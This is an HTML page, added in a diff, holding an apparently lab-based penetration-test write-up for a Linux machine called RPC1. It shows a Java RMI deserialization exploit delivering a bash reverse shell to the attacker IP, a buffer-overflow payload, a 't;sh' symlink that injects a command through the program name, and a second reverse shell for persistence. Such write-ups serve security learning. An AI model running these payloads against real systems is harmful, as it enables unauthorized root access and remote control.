@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RPC1 Pentest Report | Josh Chalabi</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-black': '#0b1020',
+                        'cyber-gray': '#0f1733',
+                        'cyber-green': '#5eead4',
+                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+                        'cyber-purple': '#a78bfa',
+                        'cyber-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        tech: ['"Share Tech Mono"', 'monospace'],
+                    },
+                    boxShadow: {
+                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0b1020; }
+        ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+        
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+        }
+        
+        /* Terminal Window Styling */
+        .terminal-window {
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin-top: 1rem;
+            margin-bottom: 1rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+        }
+        .terminal-header {
+            background-color: #161b22;
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid #30363d;
+            display: flex;
+            align-items: center;
+        }
+        .terminal-dots {
+            display: flex;
+            gap: 0.4rem;
+        }
+        .dot { width: 0.75rem; height: 0.75rem; border-radius: 50%; }
+        .dot-red { background-color: #ff5f56; }
+        .dot-yellow { background-color: #ffbd2e; }
+        .dot-green { background-color: #27c93f; }
+        .terminal-body {
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            color: #c9d1d9;
+            white-space: pre-wrap;
+            overflow-x: auto;
+        }
+        .cmd-prompt { color: #5eead4; } /* cyber-green */
+        .cmd-path { color: #a78bfa; } /* cyber-purple */
+        
+        /* Screenshot Placeholder */
+        .screenshot-placeholder {
+            border: 2px dashed #23305f;
+            background-color: rgba(15, 23, 51, 0.5);
+            border-radius: 0.5rem;
+            height: 300px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #4b5563;
+            margin-top: 1.5rem;
+            margin-bottom: 1.5rem;
+            transition: all 0.3s ease;
+        }
+        .screenshot-placeholder:hover {
+            border-color: #5eead4;
+            color: #5eead4;
+            background-color: rgba(94, 234, 212, 0.05);
+        }
+    </style>
+</head>
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+
+    <!-- Background Overlay -->
+    <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex-shrink-0">
+                    <a href="/index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+                </div>
+                <div>
+                    <a href="/reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="relative z-10 pt-32 pb-20 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+        
+        <!-- Header Section -->
+        <div class="mb-12 border-b border-[#23305f] pb-8">
+            <div class="flex items-center space-x-2 mb-4">
+                <span class="px-3 py-1 bg-red-900/30 text-red-400 border border-red-900 rounded text-xs font-bold uppercase tracking-wider">Pentest Report</span>
+                <span class="px-3 py-1 bg-[#1a2342] text-cyber-green border border-[#23305f] rounded text-xs font-bold uppercase tracking-wider">Linux</span>
+            </div>
+            <h1 class="text-4xl md:text-6xl font-bold text-white mb-4 font-tech">
+                RPC1 <span class="text-cyber-green">Machine</span>
+            </h1>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm text-gray-400 font-mono">
+                <div class="flex items-center"><i class="fas fa-bullseye w-6 text-cyber-purple"></i> Target IP: 192.168.236.236</div>
+                <div class="flex items-center"><i class="fas fa-laptop-code w-6 text-cyber-purple"></i> Attacker IP: 192.168.45.173</div>
+                <div class="flex items-center"><i class="fas fa-calendar-alt w-6 text-cyber-purple"></i> Date: 25.01.2026</div>
+            </div>
+        </div>
+
+        <!-- 1. Executive Summary -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4 flex items-center">
+                <span class="text-cyber-green mr-2">1.</span> Executive Summary
+            </h2>
+            <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 text-gray-300 leading-relaxed">
+                <p>
+                    This report documents the penetration testing activities performed on the target system with IP address <strong>192.168.236.236</strong>. During the testing process, Initial Access was achieved by exploiting a configuration error (Insecure Deserialization) in the Java RMI service. Subsequently, Privilege Escalation to <strong>ROOT</strong> was achieved by chaining a memory management error (Buffer Overflow) and a logic flaw in a custom SUID file found on the system.
+                </p>
+            </div>
+        </section>
+
+        <!-- 2. Information Gathering -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4 flex items-center">
+                <span class="text-cyber-green mr-2">2.</span> Information Gathering (Reconnaissance)
+            </h2>
+            <p class="mb-4">Comprehensive scans were performed using the Nmap tool to determine the attack surface on the target system.</p>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">2.1. Port Scanning</h3>
+            <p class="mb-2">All TCP ports (1-65535) were scanned to identify open services.</p>
+            
+            <!-- Terminal Block -->
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ nmap -p- -sS -Pn -oN all_ports 192.168.236.236</div>
+            </div>
+
+            <!-- Screenshot Placeholder -->
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/nmap_scan.png" alt="Nmap Full Port Scan Results" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 1: Nmap Full Port Scan Results]</span>
+                </div>
+            </div>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">2.2. Service Enumeration</h3>
+            <p class="mb-2">Version and script scanning was performed on the identified ports.</p>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ nmap -sCVS -p 22,1099,35742 -oN services</div>
+            </div>
+
+            <ul class="list-disc list-inside bg-cyber-gray border border-[#23305f] rounded-lg p-4 mt-4 space-y-2 text-sm">
+                <li><span class="text-cyber-purple font-bold">22/tcp (SSH):</span> OpenSSH service.</li>
+                <li><span class="text-cyber-purple font-bold">1099/tcp (Java RMI Registry):</span> Java Remote Method Invocation service.</li>
+                <li><span class="text-cyber-purple font-bold">35742/tcp (Java RMI):</span> Dynamic RMI port.</li>
+            </ul>
+        </section>
+
+        <!-- 3. Vulnerability Analysis & Initial Access -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4 flex items-center">
+                <span class="text-cyber-green mr-2">3.</span> Vulnerability Analysis & Initial Access
+            </h2>
+            <p class="mb-4">The <strong>Remote-Method-Guesser (rmg)</strong> tool was used to determine if the Java RMI service (Port 1099) was vulnerable to "Insecure Deserialization" attacks.</p>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">3.1. RMI Enumeration & Method Guessing</h3>
+            
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ rmg enum 192.168.236.236 1099
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ rmg guess 192.168.236.236 1099</div>
+            </div>
+
+            <p class="mt-4 text-sm text-gray-400 border-l-2 border-cyber-purple pl-4 italic">
+                Finding: A method named <code>logMessage(int dummy1, Object dummy2)</code> was discovered. The fact that the method accepts an <code>Object</code> type parameter indicates that malicious serialized objects (payloads) can be sent to the system using <code>ysoserial</code>.
+            </p>
+            
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/rmg_enum_guess_method.png" alt="RMG Enum and Guess Output" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 2: RMG Enum and Guess Output]</span>
+                </div>
+            </div>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">3.2. Exploitation</h3>
+            <p class="mb-2">The <code>CommonsCollections6</code> gadget chain was used to execute an attack to establish a reverse connection (reverse shell) to the system.</p>
+            
+            <div class="bg-[#1a2342] border border-[#23305f] p-3 rounded mb-4 text-xs font-mono text-cyber-green break-all">
+                Payload (Base64 Encoded): bash -i >& /dev/tcp/192.168.45.173/4444 0>&1
+            </div>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ rmg serial 192.168.236.236 1099 CommonsCollections6 \
+'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3My80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' \
+--bound-name MessengerService \
+--signature "int logMessage(int dummy1, Object dummy2)" \
+--yso /opt/ysoserial.jar --position 1 --stack-trace</div>
+            </div>
+
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/get_revshell.png" alt="Gaining Reverse Shell" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 3: Gaining Reverse Shell]</span>
+                </div>
+            </div>
+            
+            <p class="mt-4"><strong>Result:</strong> Access to the system was gained as the <strong>rmi-runner</strong> user on the attacker machine (<code>nc -nvlp 4444</code>).</p>
+        </section>
+
+        <!-- 4. Privilege Escalation -->
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4 flex items-center">
+                <span class="text-cyber-green mr-2">4.</span> Privilege Escalation
+            </h2>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">4.1. SUID File Detection</h3>
+            <p class="mb-2">Files running with root privileges (SUID bit active) were scanned.</p>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">~</span>$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/rmi-manage  <-- [Target]</div>
+            </div>
+
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/SUID_enum.png" alt="SUID Enumeration" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 4: SUID Enumeration]</span>
+                </div>
+            </div>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">4.2. Static Analysis</h3>
+            <p class="mb-4">The file was downloaded to the attacker machine and analyzed with <strong>Ghidra</strong>. The following critical structures were discovered in the <code>main</code> function.</p>
+
+            <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-4 font-mono text-sm overflow-x-auto">
+<pre><code class="language-c text-gray-300">
+// local_18 variable holds the program name (argv[0]).
+local_18 = (char *)*param_2; 
+// ...
+gets(uinput.3023); // VULN 1: Unbounded input reading (Buffer Overflow)
+// ...
+(*f_ptr.3025)(local_18); // VULN 2: argv[0] is called via function pointer.
+</code></pre>
+            </div>
+
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/main_function.png" alt="Ghidra Decompiler Output" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 5: Ghidra Decompiler Output]</span>
+                </div>
+            </div>
+
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">4.3. Dynamic Analysis & Memory Mapping</h3>
+            <p class="mb-4">Since the file has <strong>PIE (Position Independent Executable)</strong> protection, it was understood that addresses are determined at runtime. Although ASLR is disabled, live analysis was performed on the target system to determine the Base Address.</p>
+
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="text-gray-500"># 1. Creating the test copy</span>
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ cp /usr/bin/rmi-manage /tmp/rmi-test
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ chmod +x /tmp/rmi-test
+
+<span class="text-gray-500"># 2. Suspending the program and PID detection</span>
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ tail -f /dev/null | /tmp/rmi-test -i >/dev/null 2>&1 &
+[1] 3384
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ PID=$!
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ echo "PID: $PID"
+PID: 3384
+
+<span class="text-gray-500"># 3. Reading the "Executable" (r-xp) segment from memory map</span>
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ grep "r-xp" /proc/$PID/maps | head -n 1
+555555555000-555555556000 r-xp 00001000 fd:00 1774                        /tmp/rmi-test
+
+<span class="text-gray-500"># 4. Cleanup</span>
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ kill $PID
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ killall tail</div>
+            </div>
+
+            <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-4 mt-4 mb-4">
+                <h4 class="text-cyber-green font-bold mb-2">Address Calculation:</h4>
+                <ul class="text-sm space-y-1 font-mono">
+                    <li>Loaded Segment: 0x555555555000</li>
+                    <li>Segment Offset: 0x1000</li>
+                    <li><strong>Base Address:</strong> 0x555555555000 - 0x1000 = <span class="text-cyber-purple">0x555555554000</span></li>
+                    <li>System Offset: 0x1110 (Objdump)</li>
+                    <li><strong>Target Address:</strong> 0x555555554000 + 0x1110 = <span class="text-cyber-red font-bold">0x555555555110</span></li>
+                </ul>
+            </div>
+            
+            <h3 class="text-xl text-white font-bold mt-8 mb-4">4.4. Exploit Development & Attack</h3>
+            <p class="mb-4">The attack consists of two stages: <strong>Symbolic Link Attack</strong> (Manipulating the filename) and <strong>Buffer Overflow</strong> (Redirecting the function pointer to the <code>system</code> address).</p>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-2">1. Payload Creation (Kali)</h4>
+                    <div class="terminal-window mt-0">
+                        <div class="terminal-body text-xs">
+<span class="cmd-prompt">josh@csec</span>:<span class="cmd-path">~</span>$ python3 -c 'import sys; sys.stdout.buffer.write(b"0" + b"A"*15 + b"\x10\x51\x55\x55\x55\x55\x00\x00" + b"\n")' > exploit.bin</div>
+                    </div>
+                </div>
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-2">2. Symbolic Link (Target)</h4>
+                    <div class="terminal-window mt-0">
+                        <div class="terminal-body text-xs">
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ ln -s /usr/bin/rmi-manage "t;sh"</div>
+                    </div>
+                </div>
+            </div>
+
+            <h4 class="text-white font-bold mt-6 mb-2">3. Final Attack</h4>
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                </div>
+                <div class="terminal-body">
+<span class="cmd-prompt">rmi-runner@rpc1</span>:<span class="cmd-path">/tmp</span>$ (cat exploit.bin; cat) | ./t\;sh -i
+<span class="text-gray-400">Schedule &lt;./t;sh&gt; in ? minutes: </span>
+sh: 1: ./t: not found
+id
+uid=0(root) gid=0(root) groups=0(root)</div>
+            </div>
+
+            <div class="screenshot-placeholder group cursor-pointer p-0 bg-transparent" style="height:auto;">
+                <div class="border-2 border-[#23305f] rounded-lg overflow-hidden hover:border-cyber-green transition-colors duration-300 bg-[#0b1020] p-0">
+                    <img src="images/root_revshell.png" alt="Obtaining Root Shell" class="w-full h-auto max-h-none object-contain m-0" style="max-height:none;">
+                </div>
+                <div class="flex items-center justify-center py-2">
+                    <i class="fas fa-image text-2xl opacity-50 mr-2"></i>
+                    <span class="font-mono text-sm">[Screenshot 6: Obtaining Root Shell]</span>
+                </div>
+            </div>
+
+            <p class="mt-4"><strong>Persistence:</strong> A stable connection was established via the root shell:</p>
+            <div class="terminal-window">
+                <div class="terminal-body">
+bash -i >& /dev/tcp/192.168.45.173/3333 0>&1</div>
+            </div>
+        </section>
+
+        <!-- 5. Conclusion -->
+        <section class="mb-20">
+            <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4 flex items-center">
+                <span class="text-cyber-green mr-2">5.</span> Conclusion
+            </h2>
+            <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 text-gray-300">
+                <p class="mb-4">
+                    As a result of the tests performed on the target system; full control of the system (Root access) was seized by chaining the input validation deficiency in the Java RMI service and critical memory/logic errors in the <code>/usr/bin/rmi-manage</code> SUID file.
+                </p>
+                <ul class="list-disc list-inside space-y-2">
+                    <li>Java RMI service is open to insecure deserialization operations.</li>
+                    <li>Buffer Overflow exists in the <code>rmi-manage</code> application due to the use of <code>gets()</code>.</li>
+                    <li>Insecure use of function pointers and program arguments allows for privilege escalation.</li>
+                </ul>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="text-gray-600 text-sm font-mono">
+                &copy; 2026 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+            </p>
+        </div>
+    </footer>
+
+</body>
+</html>
